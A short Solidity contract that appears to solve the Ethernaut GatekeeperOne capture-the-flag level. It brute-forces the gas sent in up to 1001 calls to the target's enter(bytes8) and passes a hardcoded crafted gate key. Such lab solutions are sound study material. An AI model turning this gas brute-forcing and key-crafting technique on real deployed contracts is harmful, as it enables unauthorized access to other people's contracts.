// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateKeeperOneAttack {
    address private target;
    event Attempt(uint256 gasUsed);

    constructor(address _target) {
        target = _target;
    }

    function attack() external{
        bool flag;
        for (uint256 i = 0; i < 1001; i++) {
            (bool success, ) = target.call{gas: i + 8191 * 10}(abi.encodeWithSignature("enter(bytes8)", bytes8(0x000100000000fd48)));
            if (success) {
                emit Attempt(i);
                flag = true;
                break;
            }
        } 
        emit Attempt(1111111);
        //require(flag, "Attack failed");
    }
}
